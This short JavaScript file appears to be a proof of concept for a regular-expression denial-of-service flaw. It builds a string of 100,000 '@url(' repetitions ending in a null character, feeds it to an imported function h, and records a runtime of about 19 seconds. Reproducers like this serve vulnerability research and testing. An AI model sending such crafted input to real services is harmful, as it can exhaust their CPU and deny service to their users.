import { h } from "./emulation.js";

//Attack String :""+"@url("*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "@url(";
}
str += "\u0000";

console.log(h(str));


// real    0m19.054s
// user    0m18.889s
// sys     0m0.010s